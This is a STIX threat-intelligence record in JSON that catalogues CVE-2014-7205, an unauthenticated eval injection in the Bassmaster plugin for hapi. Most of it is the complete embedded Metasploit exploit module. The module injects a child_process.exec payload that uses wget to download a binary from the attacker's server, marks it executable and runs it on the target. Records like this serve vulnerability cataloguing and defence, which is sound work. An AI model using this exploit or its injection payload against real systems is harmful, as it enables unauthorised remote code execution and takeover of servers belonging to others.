{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bbb679ca-3483-40c1-b909-ab4630349853",
    "created": "2024-08-14T17:08:49.621995Z",
    "modified": "2024-08-14T17:08:49.621999Z",
    "name": "Bassmaster Batch Arbitrary JavaScript Injection Remote Code Execution",
    "description": " This module exploits an un-authenticated code injection vulnerability in the bassmaster nodejs plugin for hapi. The vulnerability is within the batch endpoint and allows an attacker to dynamically execute JavaScript code on the server side using an eval.  Note that the code uses a '\\x2f' character so that we hit the match on the regex. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/bassmaster_js_injection.rb",
            "external_id": "bassmaster_js_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7205"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Bassmaster Batch Arbitrary JavaScript Injection Remote Code Execution',\n      'Description'    => %q{\n        This module exploits an un-authenticated code injection vulnerability in the bassmaster\n        nodejs plugin for hapi. The vulnerability is within the batch endpoint and allows an\n        attacker to dynamically execute JavaScript code on the server side using an eval.\n\n        Note that the code uses a '\\x2f' character so that we hit the match on the regex.\n      },\n      'Author'         =>\n        [\n          'mr_me <mr_me@offensive-security.com>',      # msf\n          'Jarda Kotesovec'                            # original bug finder\n        ],\n      'References'  =>\n        [\n          [ 'CVE', '2014-7205'],\n          [ 'URL', 'https://nodesecurity.io/advisories/bassmaster_js_injection'],        # nodejs advisory\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'    => ['linux', 'bsd'],                                                 # binary > native JavaScript\n      'Arch'        => [ARCH_X86, ARCH_X64],\n      'Privileged'     => false,\n      'Targets'     =>\n        [\n          [ 'Bassmaster <= 1.5.1', {} ]                                                  # Other versions are also affected\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2016-11-01'))\n    register_options(\n      [\n        Opt::RPORT(8080),                                                                # default port for the examples/batch.js file\n        OptString.new('URIPATH', [ true, 'The path to the vulnerable route', \"/batch\"]), # default route for the examples/batch.js file\n        OptPort.new('SRVPORT', [ true, 'The daemon port to listen on', 1337 ]),\n      ])\n  end\n\n  def check\n\n    # So if we can append an encapsulated string into the body\n    # we know that we can execute arbitrary JavaScript code\n    rando  = rand_text_alpha(8+rand(8))\n    check  = \"+'#{rando}'\"\n\n    # testing\n    requests = [\n      {:method => \"get\", :path => \"/profile\"},\n      {:method => \"get\", :path => \"/item\"},\n      {:method => \"get\", :path => \"/item/$1.id#{check}\"}, # need to match this /(?:\\/)(?:\\$(\\d)+\\.)?([^\\/\\$]*)/g;\n    ]\n\n    post = {:requests => requests}\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(datastore['URIPATH']),\n      'ctype' => 'application/json',\n      'data'   => post.to_json\n    })\n\n    # default example app\n    if res and res.code == 200 and res.body =~ /#{rando}/\n      return CheckCode::Vulnerable\n\n    # non-default app\n    elsif res and res.code == 500 and res.body =~ /#{rando}/\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def on_request_uri(cli, request)\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  def send_payload\n    @bd = rand_text_alpha(8+rand(8))\n    pn  = rand_text_alpha(8+rand(8))\n    register_file_for_cleanup(\"/tmp/#{@bd}\")\n    cmd  = \"wget #{@service_url} -O \\\\x2ftmp\\\\x2f#{@bd};\"\n    cmd << \"chmod 755 \\\\x2ftmp\\\\x2f#{@bd};\"\n    cmd << \"\\\\x2ftmp\\\\x2f#{@bd}\"\n    pay = \";require('child_process').exec('#{cmd}');\"\n\n    # pwning\n    requests = [\n      {:method => \"get\", :path => \"/profile\"},\n      {:method => \"get\", :path => \"/item\"},\n      {:method => \"get\", :path => \"/item/$1.id#{pay}\"}, # need to match this /(?:\\/)(?:\\$(\\d)+\\.)?([^\\/\\$]*)/g;\n    ]\n\n    post = {:requests => requests}\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(datastore['URIPATH']),\n      'ctype' => 'application/json',\n      'data'   => post.to_json\n    })\n\n    # default example app\n    if res and res.code == 200 and res.body =~ /id/\n      return true\n\n    # incase we are not targeting the default app\n    elsif res and res.code == 500 and res.body !=~ /id/\n      return true\n    end\n    return false\n  end\n\n  def start_http_server\n    @pl = generate_payload_exe\n    @elf_sent = false\n    downfile = rand_text_alpha(8+rand(8))\n    resource_uri = \"\\\\x2f#{downfile}\"\n    if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n      srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)\n    else\n      srv_host = datastore['SRVHOST']\n    end\n\n    # do not use SSL for the attacking web server\n    if datastore['SSL']\n      ssl_restore = true\n      datastore['SSL'] = false\n    end\n\n    @service_url = \"http:\\\\x2f\\\\x2f#{srv_host}:#{datastore['SRVPORT']}#{resource_uri}\"\n    service_url_payload = srv_host + resource_uri\n    print_status(\"#{rhost}:#{rport} - Starting up our web service on #{@service_url} ...\")\n    start_service({'Uri' => {\n      'Proc' => Proc.new { |cli, req|\n        on_request_uri(cli, req)\n      },\n      'Path' => resource_uri\n    }})\n    datastore['SSL'] = true if ssl_restore\n    connect\n  end\n\n  def exploit\n      start_http_server\n      if send_payload\n        print_good(\"Injected payload\")\n        # we need to delay, for the stager\n        select(nil, nil, nil, 5)\n      end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-11-01",
    "x_mitre_platforms": [
        "['linux', 'bsd'],                                                 # binary > native JavaScript"
    ]
}